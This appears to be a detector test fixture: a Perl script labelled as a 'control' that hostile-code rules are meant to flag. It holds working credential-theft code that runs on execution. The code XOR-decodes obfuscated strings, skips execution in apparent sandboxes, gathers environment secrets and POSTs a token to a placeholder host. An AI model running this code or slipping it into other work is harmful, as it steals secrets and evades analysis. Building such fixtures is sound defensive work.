#!/usr/bin/env perl
# Control: live obfuscated env-credential theft over LWP. The XOR decoder runs
# on a Base64 payload, the filtered secrets mapping is serialized into the
# POST body, and the sandbox gate stays in place. Both hostile Perl
# composites must fire here.
use strict;
use warnings;
use MIME::Base64;

sub _x {
    my ($s) = @_;
    my $raw = decode_base64($s);
    my @k = split //, "key";
    my @b = split //, $raw;
    return join '', map { chr(ord($b[$_]) ^ ord($k[$_ % @k])) } 0 .. $#b;
}

sub _check {
    my $h = lc($ENV{HOSTNAME} // '');
    return 1 if $h =~ /sandbox|vmware|vbox/;
    return 0;
}

sub _exfil {
    return if _check();
    my %secrets = map { $_ => $ENV{$_} } grep { /KEY|SECRET|TOKEN/ } keys %ENV;
    my $c2 = _x("aGk=");
    require LWP::UserAgent;
    my $ua = LWP::UserAgent->new;
    my $c2path = _x("a2V5");
    my $body = "token=$ENV{API_TOKEN}&dump=" . join(',', values %secrets);
    $ua->post("https://example.invalid/$c2path", Content => "token=$ENV{API_TOKEN}");
}

_exfil();
